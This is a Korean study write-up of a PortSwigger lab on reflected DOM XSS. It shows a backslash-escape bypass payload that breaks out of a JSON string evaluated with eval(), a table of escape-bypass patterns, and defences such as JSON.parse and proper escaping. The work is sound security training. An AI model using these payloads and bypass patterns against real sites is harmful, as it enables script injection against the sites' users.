# Lab: Reflected DOM XSS

## 개요

- **난이도**: Practitioner
- **주제**: Cross-Site Scripting (XSS) — Reflected DOM XSS / JSON 응답 / 백슬래시 이스케이프 우회
- **링크**: https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-reflected

## 목표

서버가 검색어를 JSON으로 응답하고 클라이언트 JS가 이를 `eval()` 로 처리하는 구조에서, 백슬래시를 이용해 이스케이프를 무력화하고 `alert()` 를 실행시킨다.

## 취약점 분석

### 서버 측

검색 요청에 대해 서버가 JSON 형태로 응답한다.

```
GET /search-results?search=hello

HTTP 응답:
{"searchTerm":"hello","results":[...]}
```

서버는 JSON 내 `"` 를 `\"` 로 이스케이프하지만, `\` 자체는 이스케이프하지 않는다.

### 클라이언트 측

페이지 JS가 이 응답을 `eval()` 로 처리한다.

```javascript
// 클라이언트 JS
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
        eval('var searchResultsObj = ' + this.responseText);
        displaySearchResults(searchResultsObj);
    }
};
```

`eval()` 이 JSON 응답을 직접 JS 코드로 실행하기 때문에 DOM XSS sink가 된다.

## 공격 방법

페이로드:
```
\"-alert(1)}//
```

## 이스케이프 무력화 원리 — 단계별 분석

### 1단계: 서버의 이스케이프 동작 확인

```
입력: "hello"
서버: " → \"  (쌍따옴표만 이스케이프)
JSON: {"searchTerm":"\"hello\"","results":[...]}
      → " 가 이스케이프되어 문자열 내부에 머뭄 — 탈출 불가
```

### 2단계: `\"` 입력 시 발생하는 일

```
입력 (원시 문자): \  "
                  ↓  ↓
서버 처리:        \  →  \    (백슬래시는 그대로)
                  "  →  \"   (쌍따옴표만 이스케이프)
                  ↓
JSON 원시 바이트: \ \ "
                  ↑↑  ↑
                  \\  "
```

JSON / JavaScript 파서가 `\\` 를 만나면:

```
\\  →  리터럴 백슬래시 문자 하나 (이스케이프 문자 소비됨)
"   →  ← 이제 이 " 는 문자열을 닫는 따옴표!
```

### 3단계: 전체 페이로드 분해

```
입력: \"-alert(1)}//
         ↓
JSON: {"searchTerm":"\\"-alert(1)}//","results":[...]}
         ↓
eval() 처리:

var searchResultsObj = {"searchTerm":"\\" - alert(1)} // ","results":[...]}
                                     ^^^^   ^^^^^^^^^  ^^ ^^^^^^^^^^^^^^^^^
                                     │      │           │  │
                                     │      │           │  주석 처리됨
                                     │      │           JSON 객체 닫힘
                                     │      alert(1) 실행
                                     리터럴 백슬래시 (문자열 닫힘)
```

| 페이로드 부분 | 역할 |
|--------------|------|
| `\` | 서버의 `\"` 이스케이프를 `\\` 로 만들어 무력화 |
| `"` | JSON 문자열을 닫는 따옴표로 작동 |
| `-` | 산술 연산자로 유효한 JS 표현식 유지 |
| `alert(1)` | 실행할 코드 |
| `}` | JSON 객체 구조 닫기 |
| `//` | 뒤따르는 `,results":[...]}` 를 주석으로 처리 |

## 009 랩과의 비교 — JS 문자열 탈출의 심화

| 항목 | 009 (JS 문자열) | 012 (이번 랩) |
|------|----------------|--------------|
| 컨텍스트 | JS 문자열 리터럴 | JSON → eval() |
| 이스케이프 | `<>` 인코딩 | `"` → `\"` 이스케이프 |
| 탈출 방법 | `'` 직접 삽입 | `\"` → `\\"`로 이스케이프 무력화 |
| 닫기 문자 | `'` | `"` (이스케이프 무력화 후) |
| 나머지 처리 | `//` | `}//` (JSON 구조도 닫아야 함) |
| 연산자 | `-`, `+` 등 | `-` |

이번 랩의 핵심 차이: 서버가 `"` 를 이스케이프하므로 **이스케이프 자체를 무력화**하는 `\` 가 필요하다.

## 핵심 정리

- 서버가 `"` 만 이스케이프하고 `\` 를 이스케이프하지 않으면, `\"` 를 입력해 `\\"` 를 만들 수 있다.
- `\\` 는 리터럴 백슬래시로 해석되어 이스케이프 기능을 소모하고, 뒤의 `"` 가 문자열을 닫는다.
- `eval()` 로 JSON을 처리하는 패턴은 Reflected DOM XSS의 대표적인 구조다.
- JSON 구조(객체 `{}`) 안에 삽입된 경우, `}` 로 객체를 닫고 `//` 로 나머지를 주석 처리해야 문법 오류가 없다.
- **방어**:
  - `eval()` 대신 `JSON.parse()` 사용 (코드 실행 없이 JSON만 파싱)
  - `\` 도 `\\` 로 이스케이프 (서버 측에서 `\` 와 `"` 모두 이스케이프)
  - CSP `unsafe-eval` 비허용

## 배운 점 및 추가 학습

### 1. `eval()` vs `JSON.parse()` 차이

```javascript
// eval() — 모든 JS 표현식 실행 (위험)
eval('{"searchTerm":"\\"-alert(1)}//"}')
→ alert(1) 실행됨

// JSON.parse() — 순수 JSON 데이터만 파싱 (안전)
JSON.parse('{"searchTerm":"\\"-alert(1)}//"}')
→ SyntaxError: Unexpected token - in JSON
→ 코드 실행 없이 파싱 실패로 종료
```

`eval()` 은 문자열을 JS 코드로 실행하기 때문에 JSON 형태의 문자열도 표현식으로 처리한다.  
`JSON.parse()` 는 JSON 문법만 허용하므로 JS 코드 실행이 불가능하다.

### 2. 이스케이프 처리의 올바른 방법

서버 측에서 JSON 문자열에 사용자 입력을 삽입할 때 반드시 `\` 와 `"` 를 모두 이스케이프해야 한다.

```javascript
// 잘못된 처리 — " 만 이스케이프
function unsafe(input) {
    return input.replace(/"/g, '\\"');
    // 입력 \"  → 결과 \\"  → 탈출 가능!
}

// 올바른 처리 — \ 를 먼저, 그 다음 "
function safe(input) {
    return input
        .replace(/\\/g, '\\\\')  // \ → \\
        .replace(/"/g, '\\"');   // " → \"
    // 입력 \"  → 결과 \\\\"  → 탈출 불가
}

// 가장 올바른 처리 — JSON.stringify() 사용
function safest(input) {
    return JSON.stringify(input);  // 모든 특수문자 자동 처리
}
```

### 3. 이스케이프 우회 패턴 정리

서버의 이스케이프 처리가 불완전할 때 활용하는 패턴들:

| 서버 처리 | 우회 방법 | 원리 |
|-----------|-----------|------|
| `"` → `\"` | `\"` 입력 | `\\"` 생성 → `\\`(리터럴 `\`) + `"`(문자열 종료) |
| `'` → `\'` | `\'` 입력 | `\\'` 생성 → 동일 원리 |
| `<` → `<` | 무관 (JS 문자열 탈출이 목적) | |
| `\n` 제거 | `\r` 또는 유니코드 줄바꿈 사용 | |
| 재귀 치환 없음 | `\"\"` → `\\"\"` | 첫 번째가 탈출, 두 번째로 구조 조작 |

### 4. Reflected DOM XSS vs 일반 Reflected XSS

| 항목 | 일반 Reflected XSS | Reflected DOM XSS (이번 랩) |
|------|-------------------|---------------------------|
| 처리 위치 | 서버가 HTML에 삽입 | 서버는 JSON만 반환, **클라이언트 JS가 처리** |
| 서버 응답에 페이로드 포함 | O (HTML에 직접) | O (JSON 데이터로) |
| WAF 탐지 | HTML 패턴으로 탐지 가능 | JSON 데이터라 탐지 어려움 |
| 실행 경로 | 서버 → 브라우저 렌더링 | 서버 → JS `eval()` → 실행 |

서버 응답이 JSON 형태이기 때문에 WAF가 HTML XSS 패턴으로는 탐지하기 어렵고, 클라이언트 JS의 `eval()` 처리 방식에 취약점이 있다.
